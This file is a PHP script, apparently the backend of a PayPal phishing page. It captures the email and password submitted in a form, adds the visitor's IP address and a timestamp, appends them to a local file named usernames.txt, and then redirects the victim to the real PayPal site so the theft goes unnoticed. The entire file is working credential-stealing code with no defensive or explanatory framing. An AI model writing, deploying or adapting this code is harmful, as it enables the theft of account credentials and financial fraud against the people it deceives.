<?php
$email = $_POST['email'];
$pass = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];
$time = date('Y-m-d H:i:s');

file_put_contents('usernames.txt', "[$time] IP: $ip | Email: $email | Pass: $pass\n", FILE_APPEND);

header("Location: https://www.paypal.com");
exit();
?>
